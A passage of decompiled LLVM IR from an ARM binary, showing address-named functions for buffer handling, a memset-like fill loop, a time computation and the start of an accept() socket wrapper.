  br i1 %v2_bc74, label %dec_label_pc_bcc4, label %dec_label_pc_bc7c

dec_label_pc_bc7c:                                ; preds = %dec_label_pc_bc6c
  store i32 0, i32* @r4, align 4
  %v2_bc80 = add i32 %v1_bc70, 16
  %v3_bc80 = inttoptr i32 %v2_bc80 to i32*
  store i32 0, i32* %v3_bc80, align 4
  %v2_bc88 = icmp ugt i32 %tmp, 511
  %v1_bc8c = load i32, i32* @r6, align 4
  %v2_bc8c = add i32 %v1_bc8c, 20
  %v3_bc8c = inttoptr i32 %v2_bc8c to i32*
  store i32 %tmp, i32* %v3_bc8c, align 4
  br i1 %v2_bc88, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bc7c
  %v2_bc94 = load i32, i32* @r6, align 4
  %v3_bc94 = add i32 %v2_bc94, 20
  %v4_bc94 = inttoptr i32 %v3_bc94 to i32*
  store i32 512, i32* %v4_bc94, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bc7c, %bb
  %v0_bc98 = load i32, i32* @r7, align 4
  %v1_bc98 = load i32, i32* @r6, align 4
  %v2_bc98 = inttoptr i32 %v1_bc98 to i32*
  store i32 %v0_bc98, i32* %v2_bc98, align 4
  %v0_bc9c = load i32, i32* @r4, align 4
  %v1_bc9c = load i32, i32* @r6, align 4
  %v2_bc9c = add i32 %v1_bc9c, 8
  %v3_bc9c = inttoptr i32 %v2_bc9c to i32*
  store i32 %v0_bc9c, i32* %v3_bc9c, align 4
  %v0_bca0 = load i32, i32* @r4, align 4
  %v1_bca0 = load i32, i32* @r6, align 4
  %v2_bca0 = add i32 %v1_bca0, 4
  %v3_bca0 = inttoptr i32 %v2_bca0 to i32*
  store i32 %v0_bca0, i32* %v3_bca0, align 4
  %v0_bca8 = load i32, i32* @r6, align 4
  %v1_bca8 = add i32 %v0_bca8, 20
  %v2_bca8 = inttoptr i32 %v1_bca8 to i32*
  %v3_bca8 = load i32, i32* %v2_bca8, align 4
  %v2_bcac = call i32 @function_c34c(i32 1, i32 %v3_bca8)
  %v2_bcb0 = icmp eq i32 %v2_bcac, 0
  %v1_bcb4 = load i32, i32* @r6, align 4
  %v2_bcb4 = add i32 %v1_bcb4, 12
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  store i32 %v2_bcac, i32* %v3_bcb4, align 4
  br i1 %v2_bcb0, label %dec_label_pc_bcbc, label %dec_label_pc_bce0

dec_label_pc_bcbc:                                ; preds = %.thread
  %v0_bcbc = load i32, i32* @r6, align 4
  %v1_bcc0 = call i32 @function_c3a4(i32 %v0_bcbc)
  br label %dec_label_pc_bcc4

dec_label_pc_bcc4:                                ; preds = %dec_label_pc_bc6c, %dec_label_pc_bcbc
  %v0_bcc4 = load i32, i32* @r7, align 4
  %v1_bcc8 = call i32 @function_b880(i32 %v0_bcc4)
  %v0_bccc = call i32 @function_bdd4()
  store i32 0, i32* @r6, align 4
  %v2_bcd8 = inttoptr i32 %v0_bccc to i32*
  store i32 12, i32* %v2_bcd8, align 4
  br label %dec_label_pc_bcf4

dec_label_pc_bce0:                                ; preds = %.thread
  store i32 48372, i32* @lr, align 4
  %v1_bcf0 = call i32 @function_cdec()
  br label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %.thread1, %dec_label_pc_bcc4, %dec_label_pc_bc4c, %dec_label_pc_bce0
  %v0_bcf4 = load i32, i32* @r6, align 4
  store i32 %v3_bc08, i32* @r4, align 4
  store i32 %v9_bc08, i32* @r6, align 4
  store i32 %v12_bc08, i32* @r7, align 4
  ret i32 %v0_bcf4

; uselistorder directives
  uselistorder i32 (i32)* @function_c3a4, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32)* @function_c34c, { 0, 4, 2, 1, 3 }
  uselistorder i32 512, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_b880, { 6, 5, 4, 14, 13, 1, 0, 12, 11, 3, 10, 9, 8, 7, 2 }
  uselistorder i32* @r7, { 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 42, 43, 1, 2, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 4, 13, 9, 6, 23, 7, 8, 10, 24, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 27, 26, 28, 29, 55, 5, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 41, 56, 64, 72, 73, 74, 57, 58, 59, 60, 61, 62, 63, 65, 66, 67, 68, 69, 70, 71, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 99, 100, 101, 102, 103, 104, 105, 0, 106, 85, 86, 87, 88 }
  uselistorder label %dec_label_pc_bcf4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_bcc4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_bd04(i32* %arg1) local_unnamed_addr {
dec_label_pc_bd04:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_bd04 = load i32, i32* @r4, align 4
  %v6_bd04 = load i32, i32* @r5, align 4
  %v9_bd04 = load i32, i32* @lr, align 4
  %v1_bd08 = add i32 %tmp, 24
  store i32 %v1_bd08, i32* @r4, align 4
  %v2_bd0c = ptrtoint i32* %stack_var_-28 to i32
  store i32 52724, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v2_bd0c, i32* @r0, align 4
  store i32 %v1_bd08, i32* %r2.global-to-local, align 4
  %v8_bd28 = call i32 @function_cdf4(i32 %v2_bd0c, i32 ptrtoint (i32* @global_var_cdec.209 to i32), i32 %v1_bd08, i32 52724, i32 %v3_bd04, i32 %v6_bd04, i32 %v9_bd04)
  %v0_bd2c = load i32, i32* @r4, align 4
  store i32 %v0_bd2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_cdec.209 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_bd3c.218 to i32), i32* @lr, align 4
  %v1_bd38 = call i32 @function_cdec()
  store i32 %v1_bd38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd3c

dec_label_pc_bd3c:                                ; preds = %dec_label_pc_bd70, %dec_label_pc_bd04
  %v0_bd3c = load i32, i32* @r5, align 4
  %v1_bd3c = add i32 %v0_bd3c, 4
  %v2_bd3c = inttoptr i32 %v1_bd3c to i32*
  %v3_bd3c = load i32, i32* %v2_bd3c, align 4
  store i32 %v3_bd3c, i32* %r2.global-to-local, align 4
  %v4_bd3c = add i32 %v0_bd3c, 8
  %v5_bd3c = inttoptr i32 %v4_bd3c to i32*
  %v6_bd3c = load i32, i32* %v5_bd3c, align 4
  store i32 %v6_bd3c, i32* %r3.global-to-local, align 4
  %tmp8 = icmp ugt i32 %v6_bd3c, %v3_bd3c
  br i1 %tmp8, label %dec_label_pc_bd70, label %dec_label_pc_bd48

dec_label_pc_bd48:                                ; preds = %dec_label_pc_bd3c
  %v1_bd48 = inttoptr i32 %v0_bd3c to i32*
  %v2_bd48 = load i32, i32* %v1_bd48, align 4
  store i32 %v2_bd48, i32* @r0, align 4
  %v1_bd4c = add i32 %v0_bd3c, 12
  %v2_bd4c = inttoptr i32 %v1_bd4c to i32*
  %v3_bd4c = load i32, i32* %v2_bd4c, align 4
  %v1_bd50 = add i32 %v0_bd3c, 20
  %v2_bd50 = inttoptr i32 %v1_bd50 to i32*
  %v3_bd50 = load i32, i32* %v2_bd50, align 4
  store i32 %v3_bd50, i32* @r2, align 4
  %v4_bd54 = call i32 @function_d294(i32 %v2_bd48, i32 %v3_bd4c, i32 %v3_bd50, i32 %v6_bd3c)
  store i32 %v4_bd54, i32* %r0.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_bd54, 1
  br i1 %tmp7, label %.thread, label %dec_label_pc_bd64

.thread:                                          ; preds = %dec_label_pc_bd48
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_bda4

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd48
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_bd68 = load i32, i32* @r5, align 4
  %v2_bd68 = add i32 %v1_bd68, 4
  %v3_bd68 = inttoptr i32 %v2_bd68 to i32*
  store i32 0, i32* %v3_bd68, align 4
  %v1_bd6c = load i32, i32* @r5, align 4
  %v2_bd6c = add i32 %v1_bd6c, 8
  %v3_bd6c = inttoptr i32 %v2_bd6c to i32*
  store i32 %v4_bd54, i32* %v3_bd6c, align 4
  %v0_bd70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bd70

dec_label_pc_bd70:                                ; preds = %dec_label_pc_bd3c, %dec_label_pc_bd64
  %v1_bd88 = phi i32 [ %v0_bd3c, %dec_label_pc_bd3c ], [ %v0_bd70.pre, %dec_label_pc_bd64 ]
  %v1_bd70 = add i32 %v1_bd88, 4
  %v2_bd70 = inttoptr i32 %v1_bd70 to i32*
  %v3_bd70 = load i32, i32* %v2_bd70, align 4
  store i32 %v3_bd70, i32* %r2.global-to-local, align 4
  %v1_bd74 = add i32 %v1_bd88, 12
  %v2_bd74 = inttoptr i32 %v1_bd74 to i32*
  %v3_bd74 = load i32, i32* %v2_bd74, align 4
  store i32 %v3_bd74, i32* %ip.global-to-local, align 4
  %v2_bd78 = add i32 %v3_bd74, %v3_bd70
  store i32 %v2_bd78, i32* @r4, align 4
  %v1_bd7c = add i32 %v2_bd78, 4
  %v2_bd7c = inttoptr i32 %v1_bd7c to i32*
  %v3_bd7c = load i32, i32* %v2_bd7c, align 4
  %v1_bd80 = add i32 %v2_bd78, 8
  %v2_bd80 = inttoptr i32 %v1_bd80 to i8*
  %v3_bd80 = load i8, i8* %v2_bd80, align 1
  %v4_bd80 = zext i8 %v3_bd80 to i32
  store i32 %v4_bd80, i32* %r3.global-to-local, align 4
  %v1_bd84 = add i32 %v2_bd78, 9
  %v2_bd84 = inttoptr i32 %v1_bd84 to i8*
  %v3_bd84 = load i8, i8* %v2_bd84, align 1
  %v4_bd84 = zext i8 %v3_bd84 to i32
  store i32 %v4_bd84, i32* %r0.global-to-local, align 4
  %v2_bd88 = add i32 %v1_bd88, 16
  %v3_bd88 = inttoptr i32 %v2_bd88 to i32*
  store i32 %v3_bd7c, i32* %v3_bd88, align 4
  %v0_bd8c = load i32, i32* %r2.global-to-local, align 4
  %v1_bd8c = load i32, i32* %ip.global-to-local, align 4
  %v2_bd8c = add i32 %v1_bd8c, %v0_bd8c
  %v3_bd8c = inttoptr i32 %v2_bd8c to i32*
  %v4_bd8c = load i32, i32* %v3_bd8c, align 4
  %v0_bd90 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd90 = load i32, i32* %r0.global-to-local, align 4
  %v4_bd90 = mul i32 %v1_bd90, 256
  %v5_bd90 = or i32 %v4_bd90, %v0_bd90
  store i32 %v5_bd90, i32* %r3.global-to-local, align 4
  %v2_bd94 = add i32 %v5_bd90, %v0_bd8c
  store i32 %v2_bd94, i32* @r2, align 4
  %v2_bd98 = icmp eq i32 %v4_bd8c, 0
  %v1_bd9c = load i32, i32* @r5, align 4
  %v2_bd9c = add i32 %v1_bd9c, 4
  %v3_bd9c = inttoptr i32 %v2_bd9c to i32*
  store i32 %v2_bd94, i32* %v3_bd9c, align 4
  br i1 %v2_bd98, label %dec_label_pc_bd3c, label %dec_label_pc_bda4

dec_label_pc_bda4:                                ; preds = %dec_label_pc_bd70, %.thread
  store i32 %v2_bd0c, i32* @r0, align 4
  store i32 52724, i32* %r3.global-to-local, align 4
  store i32 48568, i32* @lr, align 4
  %v3_bdb4 = load i32, i32* @r2, align 4
  %v8_bdb4 = call i32 @function_cdf4(i32 %v2_bd0c, i32 1, i32 %v3_bdb4, i32 52724, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_bdb8 = load i32, i32* @r4, align 4
  store i32 %v0_bdb8, i32* %r0.global-to-local, align 4
  store i32 %v3_bd04, i32* @r4, align 4
  store i32 %v6_bd04, i32* @r5, align 4
  ret i32 %v0_bdb8

; uselistorder directives
  uselistorder i32 %v1_bd88, { 0, 2, 1 }
  uselistorder i32 %v6_bd3c, { 1, 0, 2 }
  uselistorder i32 %v0_bd3c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_bd0c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bd08, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 1, 5, 6, 0 }
  uselistorder label %dec_label_pc_bd70, { 1, 0 }
}

define i32 @function_bdd4() local_unnamed_addr {
dec_label_pc_bdd4:
  ret i32 ptrtoint (i32* @global_var_1748c.221 to i32)
}

define i32 @function_bde0(i32 %arg1) local_unnamed_addr {
dec_label_pc_bde0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v1_bdec = bitcast i32* %stack_var_-20 to %tms*
  %v2_bdec = call i32 @function_d690(%tms* %v1_bdec)
  %v2_bdf4 = load i32, i32* %stack_var_-20, align 4
  %v2_bdf8 = add i32 %v2_bdf4, %tmp
  %v2_be00 = mul i32 %v2_bdf8, 10000
  %v1_be04 = and i32 %v2_be00, 2147483632
  ret i32 %v1_be04

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_be20(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_be20:
  %v0_be20 = call i32 @function_daa0()
  ret i32 %v0_be20
}

define i32 @function_be30(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_be30:
  %v0_be30 = call i32 @function_daa0()
  ret i32 %v0_be30

; uselistorder directives
  uselistorder i32 ()* @function_daa0, { 1, 0 }
}

define i32 @function_be40(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_be40:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_be44 = load i32, i32* @r2, align 4
  %v8_be44 = icmp eq i32 %v0_be44, 8
  store i1 %v8_be44, i1* %cpsr_z.global-to-local, align 1
  %v5_be48 = icmp slt i32 %v0_be44, 8
  br i1 %v5_be48, label %dec_label_pc_bea8, label %dec_label_pc_be4c

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be40
  %v4_be4c = mul i32 %arg2, 256
  %v5_be4c = or i32 %v4_be4c, %arg2
  %v4_be50 = mul i32 %v5_be4c, 65536
  %v5_be50 = or i32 %v4_be50, %v5_be4c
  store i32 %v5_be50, i32* %r1.global-to-local, align 4
  %v1_be5457 = urem i32 %tmp, 4
  %v2_be5458 = icmp eq i32 %v1_be5457, 0
  store i1 %v2_be5458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_be5458, label %dec_label_pc_be64, label %bb

bb:                                               ; preds = %dec_label_pc_be4c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_be4c ]
  %v3_be5859 = phi i32 [ %v6_be58, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_be4c ]
  %v4_be58 = inttoptr i32 %v3_be5859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_be58, align 1
  %v5_be58 = load i32, i32* %r3.global-to-local, align 4
  %v6_be58 = add i32 %v5_be58, 1
  store i32 %v6_be58, i32* %r3.global-to-local, align 4
  %v0_be5c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_be68.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_be5c.pr, label %dec_label_pc_be64, label %.thread

.thread:                                          ; preds = %bb
  %v2_be5c = add i32 %v0_be68.pr.pre, -1
  store i32 %v2_be5c, i32* @r2, align 4
  %v1_be54 = urem i32 %v6_be58, 4
  %v2_be54 = icmp eq i32 %v1_be54, 0
  store i1 %v2_be54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_be54, label %dec_label_pc_be64, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_be58.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_be58.pre to i8
  br label %bb

dec_label_pc_be64:                                ; preds = %.thread, %bb, %dec_label_pc_be4c
  %v0_be7028 = phi i32 [ %tmp, %dec_label_pc_be4c ], [ %v6_be58, %bb ], [ %v6_be58, %.thread ]
  %v0_be68.pr = phi i32 [ %v0_be44, %dec_label_pc_be4c ], [ %v0_be68.pr.pre, %bb ], [ %v2_be5c, %.thread ]
  %v0_be64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_be64, i32* %ip.global-to-local, align 4
  %v8_be6810 = icmp eq i32 %v0_be68.pr, 8
  store i1 %v8_be6810, i1* %cpsr_z.global-to-local, align 1
  %v5_be6c11 = icmp slt i32 %v0_be68.pr, 8
  br i1 %v5_be6c11, label %dec_label_pc_bea8, label %dec_label_pc_be70.preheader

dec_label_pc_be70.preheader:                      ; preds = %dec_label_pc_be64
  %v1_be7046 = inttoptr i32 %v0_be7028 to i32*
  store i32 %v0_be64, i32* %v1_be7046, align 4
  %v3_be7047 = add i32 %v0_be7028, 4
  %v4_be7048 = inttoptr i32 %v3_be7047 to i32*
  %v5_be7049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_be7049, i32* %v4_be7048, align 4
  %v6_be7050 = add i32 %v0_be7028, 8
  store i32 %v6_be7050, i32* %r3.global-to-local, align 4
  %v0_be7451 = load i32, i32* @r2, align 4
  %v1_be7452 = add i32 %v0_be7451, -8
  store i32 %v1_be7452, i32* %r2.global-to-local, align 4
  %v5_be7c53 = icmp slt i32 %v1_be7452, 8
  br i1 %v5_be7c53, label %dec_label_pc_be70.dec_label_pc_bea8.loopexit_crit_edge, label %dec_label_pc_be80

dec_label_pc_be80:                                ; preds = %dec_label_pc_be70.preheader, %dec_label_pc_be68.dec_label_pc_be70_crit_edge
  %v6_be7055 = phi i32 [ %v6_be70, %dec_label_pc_be68.dec_label_pc_be70_crit_edge ], [ %v6_be7050, %dec_label_pc_be70.preheader ]
  %v0_be7054 = phi i32 [ %v12_be9c, %dec_label_pc_be68.dec_label_pc_be70_crit_edge ], [ %v0_be7028, %dec_label_pc_be70.preheader ]
  %v1_be80 = inttoptr i32 %v6_be7055 to i32*
  %v2_be80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_be80, i32* %v1_be80, align 4
  %v3_be80 = add i32 %v0_be7054, 12
  %v4_be80 = inttoptr i32 %v3_be80 to i32*
  %v5_be80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_be80, i32* %v4_be80, align 4
  %v6_be80 = add i32 %v0_be7054, 16
  store i32 %v6_be80, i32* %r3.global-to-local, align 4
  %v0_be84 = load i32, i32* %r2.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, -8
  store i32 %v1_be84, i32* %r2.global-to-local, align 4
  %v5_be8c = icmp slt i32 %v1_be84, 8
  br i1 %v5_be8c, label %dec_label_pc_be80.dec_label_pc_bea8.loopexit_crit_edge, label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_be80
  %v1_be90 = inttoptr i32 %v6_be80 to i32*
  %v2_be90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_be90, i32* %v1_be90, align 4
  %v3_be90 = add i32 %v0_be7054, 20
  %v4_be90 = inttoptr i32 %v3_be90 to i32*
  %v5_be90 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_be90, i32* %v4_be90, align 4
  %v6_be90 = add i32 %v0_be7054, 24
  store i32 %v6_be90, i32* %r3.global-to-local, align 4
  %v0_be94 = load i32, i32* %r2.global-to-local, align 4
  %v1_be94 = add i32 %v0_be94, -8
  store i32 %v1_be94, i32* %r2.global-to-local, align 4
  %v5_be9c = icmp slt i32 %v1_be94, 8
  br i1 %v5_be9c, label %dec_label_pc_be90.dec_label_pc_bea8.loopexit_crit_edge, label %dec_label_pc_be68

dec_label_pc_be68:                                ; preds = %dec_label_pc_be90
  %v7_be9c = inttoptr i32 %v6_be90 to i32*
  %v8_be9c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_be9c, i32* %v7_be9c, align 4
  %v9_be9c = add i32 %v0_be7054, 28
  %v10_be9c = inttoptr i32 %v9_be9c to i32*
  %v11_be9c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_be9c, i32* %v10_be9c, align 4
  %v12_be9c = add i32 %v0_be7054, 32
  store i32 %v12_be9c, i32* %r3.global-to-local, align 4
  %v6_bea0 = load i32, i32* %r2.global-to-local, align 4
  %v7_bea0 = add i32 %v6_bea0, -8
  store i32 %v7_bea0, i32* %r2.global-to-local, align 4
  %v5_be6c = icmp slt i32 %v7_bea0, 8
  br i1 %v5_be6c, label %dec_label_pc_be68.dec_label_pc_bea8.loopexit_crit_edge, label %dec_label_pc_be68.dec_label_pc_be70_crit_edge

dec_label_pc_be68.dec_label_pc_be70_crit_edge:    ; preds = %dec_label_pc_be68
  %v2_be70.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_be70 = inttoptr i32 %v12_be9c to i32*
  store i32 %v2_be70.pre, i32* %v1_be70, align 4
  %v3_be70 = add i32 %v0_be7054, 36
  %v4_be70 = inttoptr i32 %v3_be70 to i32*
  %v5_be70 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_be70, i32* %v4_be70, align 4
  %v6_be70 = add i32 %v0_be7054, 40
  store i32 %v6_be70, i32* %r3.global-to-local, align 4
  %v0_be74 = load i32, i32* %r2.global-to-local, align 4
  %v1_be74 = add i32 %v0_be74, -8
  store i32 %v1_be74, i32* %r2.global-to-local, align 4
  %v5_be7c = icmp slt i32 %v1_be74, 8
  br i1 %v5_be7c, label %dec_label_pc_be70.dec_label_pc_bea8.loopexit_crit_edge, label %dec_label_pc_be80

dec_label_pc_be70.dec_label_pc_bea8.loopexit_crit_edge: ; preds = %dec_label_pc_be68.dec_label_pc_be70_crit_edge, %dec_label_pc_be70.preheader
  %v1_be74.lcssa = phi i32 [ %v1_be7452, %dec_label_pc_be70.preheader ], [ %v1_be74, %dec_label_pc_be68.dec_label_pc_be70_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bea8

dec_label_pc_be68.dec_label_pc_bea8.loopexit_crit_edge: ; preds = %dec_label_pc_be68
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bea8

dec_label_pc_be80.dec_label_pc_bea8.loopexit_crit_edge: ; preds = %dec_label_pc_be80
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bea8

dec_label_pc_be90.dec_label_pc_bea8.loopexit_crit_edge: ; preds = %dec_label_pc_be90
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bea8

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be64, %dec_label_pc_be70.dec_label_pc_bea8.loopexit_crit_edge, %dec_label_pc_be68.dec_label_pc_bea8.loopexit_crit_edge, %dec_label_pc_be80.dec_label_pc_bea8.loopexit_crit_edge, %dec_label_pc_be90.dec_label_pc_bea8.loopexit_crit_edge, %dec_label_pc_be40
  %v0_beb0 = phi i32 [ %v0_be44, %dec_label_pc_be40 ], [ %v1_be94, %dec_label_pc_be90.dec_label_pc_bea8.loopexit_crit_edge ], [ %v1_be84, %dec_label_pc_be80.dec_label_pc_bea8.loopexit_crit_edge ], [ %v7_bea0, %dec_label_pc_be68.dec_label_pc_bea8.loopexit_crit_edge ], [ %v1_be74.lcssa, %dec_label_pc_be70.dec_label_pc_bea8.loopexit_crit_edge ], [ %v0_be68.pr, %dec_label_pc_be64 ]
  %v2_bea8 = icmp eq i32 %v0_beb0, 0
  store i1 %v2_bea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bea8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_bea8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_bea8
  %v1_beb0 = sub i32 7, %v0_beb0
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v3_beb4 = mul i32 %v1_beb0, 4
  %v4_beb4 = add i32 %v3_beb4, ptrtoint (i32* @global_var_bebc.223 to i32)
  call void @__pseudo_branch(i32 %v4_beb4)
  %v0_bebc = load i32, i32* %r1.global-to-local, align 4
  %v1_bebc = trunc i32 %v0_bebc to i8
  %v2_bebc = load i32, i32* %r3.global-to-local, align 4
  %v3_bebc = inttoptr i32 %v2_bebc to i8*
  store i8 %v1_bebc, i8* %v3_bebc, align 1
  %v4_bebc = load i32, i32* %r3.global-to-local, align 4
  %v5_bebc = add i32 %v4_bebc, 1
  store i32 %v5_bebc, i32* %r3.global-to-local, align 4
  %v0_bec0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v0_bec0 to i8
  %v3_bec0 = inttoptr i32 %v5_bebc to i8*
  store i8 %v1_bec0, i8* %v3_bec0, align 1
  %v4_bec0 = load i32, i32* %r3.global-to-local, align 4
  %v5_bec0 = add i32 %v4_bec0, 1
  store i32 %v5_bec0, i32* %r3.global-to-local, align 4
  %v0_bec4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bec4 = trunc i32 %v0_bec4 to i8
  %v3_bec4 = inttoptr i32 %v5_bec0 to i8*
  store i8 %v1_bec4, i8* %v3_bec4, align 1
  %v4_bec4 = load i32, i32* %r3.global-to-local, align 4
  %v5_bec4 = add i32 %v4_bec4, 1
  store i32 %v5_bec4, i32* %r3.global-to-local, align 4
  %v0_bec8 = load i32, i32* %r1.global-to-local, align 4
  %v1_bec8 = trunc i32 %v0_bec8 to i8
  %v3_bec8 = inttoptr i32 %v5_bec4 to i8*
  store i8 %v1_bec8, i8* %v3_bec8, align 1
  %v4_bec8 = load i32, i32* %r3.global-to-local, align 4
  %v5_bec8 = add i32 %v4_bec8, 1
  store i32 %v5_bec8, i32* %r3.global-to-local, align 4
  %v0_becc = load i32, i32* %r1.global-to-local, align 4
  %v1_becc = trunc i32 %v0_becc to i8
  %v3_becc = inttoptr i32 %v5_bec8 to i8*
  store i8 %v1_becc, i8* %v3_becc, align 1
  %v4_becc = load i32, i32* %r3.global-to-local, align 4
  %v5_becc = add i32 %v4_becc, 1
  store i32 %v5_becc, i32* %r3.global-to-local, align 4
  %v0_bed0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bed0 = trunc i32 %v0_bed0 to i8
  %v3_bed0 = inttoptr i32 %v5_becc to i8*
  store i8 %v1_bed0, i8* %v3_bed0, align 1
  %v4_bed0 = load i32, i32* %r3.global-to-local, align 4
  %v5_bed0 = add i32 %v4_bed0, 1
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bed4 = trunc i32 %v0_bed4 to i8
  %v3_bed4 = inttoptr i32 %v5_bed0 to i8*
  store i8 %v1_bed4, i8* %v3_bed4, align 1
  %v4_bed4 = load i32, i32* %r3.global-to-local, align 4
  %v5_bed4 = add i32 %v4_bed4, 1
  store i32 %v5_bed4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_be70, { 1, 0 }
  uselistorder i32 %v12_be9c, { 1, 2, 0 }
  uselistorder i32 %v0_be7054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_be68.pr, { 0, 2, 1 }
  uselistorder i32 %v6_be58, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_be4c, { 1, 0 }
  uselistorder i32 %v0_be44, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 5, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_bea8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_be80, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_bee0(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bee0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bee0 = load i32, i32* @r4, align 4
  store i32 %v3_bee0, i32* %stack_var_-8, align 4
  %v5_bee4 = inttoptr i32 %arg3 to i32*
  %v6_bee4 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_bee4)
  store i32 %v6_bee4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_bee4, -4095
  br i1 %tmp, label %dec_label_pc_bf04, label %dec_label_pc_bef4

